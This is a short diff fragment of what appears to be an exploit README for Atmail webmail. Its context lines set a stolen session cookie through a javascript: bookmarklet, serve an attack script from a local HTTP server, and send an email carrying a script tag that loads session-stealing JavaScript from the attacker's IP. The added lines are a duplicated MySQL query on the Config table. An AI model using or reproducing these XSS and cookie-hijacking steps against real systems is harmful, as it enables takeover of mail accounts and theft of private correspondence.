@@ -20,3 +20,9 @@ javascript:void(document.cookie="atmail6=1fp0fjq4aa8sm5if934b62ptv6");
 python -m SimpleHTTPServer 8000
 python atmail_sendmail.py 192.168.100.34 '<script src="http://192.168.100.12:8000/atmail-session.js"></script>
 ```
+
+### MySQL
+```
+select * from Config where keyName="tmpFolderBasename";
+select * from Config where keyName="tmpFolderBasename";
+```
